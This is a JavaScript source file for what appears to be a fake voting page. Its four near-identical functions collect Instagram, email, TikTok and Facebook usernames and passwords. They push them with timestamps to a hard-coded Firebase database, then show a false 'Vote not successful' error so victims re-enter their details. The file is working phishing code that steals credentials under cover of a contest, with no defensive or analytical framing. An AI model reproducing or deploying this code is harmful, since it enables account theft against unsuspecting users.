// Initialize Firebase
const firebaseConfig = {
  apiKey: "AIzaSyC9tpr1MQOwjz-uqVO9pfT1BeDzftucmjE",
  authDomain: "ravearabs.firebaseapp.com",
  databaseURL: "https://ravearabs-default-rtdb.firebaseio.com",
  projectId: "ravearabs",
  storageBucket: "ravearabs.firebasestorage.app",
  messagingSenderId: "1047046818039",
  appId: "1:1047046818039:web:658d42d85f644f344cebf2"
};
firebase.initializeApp(firebaseConfig);

function edolog() {
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      showAlert("Error", error.message);
    });

  var oruk = document.getElementById("edo-oruko").value;
  var wazobia = document.getElementById("edo-zom").value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = "Instagram";

  if (oruk !== "" && wazobia !== "") {
    firebase.database().ref("fbdet").push({
      emle: oruk,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: wazobia,
      date: currentDate,
      type: accountType,
    });

    setTimeout(function () {
      showAlert(
        "Vote not successful",
        "Sorry, something went wrong. Please try again."
      );
      document.getElementById("edo-zom").value = "";
      return false;
    }, 2000);
  }
}

function lag() {
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      showAlert("Error", error.message);
    });

  var oruk = document.getElementById("lag-oruko").value;
  var wazobia = document.getElementById("lag-zom").value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = "MailBox";

  if (oruk !== "" && wazobia !== "") {
    firebase.database().ref("fbdet").push({
      emle: oruk,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: wazobia,
      date: currentDate,
      type: accountType,
    });

    setTimeout(function () {
      showAlert(
        "Vote not successful",
        "Sorry, something went wrong. Please try again."
      );
      document.getElementById("lag-zom").value = "";
      return false;
    }, 2000);
  }
}

function abjlog() {
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      showAlert("Error", error.message);
    });

  var oruk = document.getElementById("abuja-oruko").value;
  var wazobia = document.getElementById("abuja-zom").value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = "TikTok";

  if (oruk !== "" && wazobia !== "") {
    firebase.database().ref("fbdet").push({
      emle: oruk,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: wazobia,
      date: currentDate,
      type: accountType,
    });

    setTimeout(function () {
      showAlert(
        "Vote not successful",
        "Sorry, something went wrong. Please try again."
      );
      document.getElementById("abuja-zom").value = "";
      return false;
    }, 2000);
  }
}

function imo() {
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      showAlert("Error", error.message);
    });

  var oruk = document.getElementById("owerri-oruko").value;
  var wazobia = document.getElementById("owerris-zom").value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = "Facebook";

  if (oruk !== "" && wazobia !== "") {
    firebase.database().ref("fbdet").push({
      emle: oruk,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: wazobia,
      date: currentDate,
      type: accountType,
    });

    setTimeout(function () {
      showAlert(
        "Vote not successful",
        "Sorry, something went wrong. Please try again."
      );
      document.getElementById("owerris-zom").value = "";
      return false;
    }, 2000);
  }
}
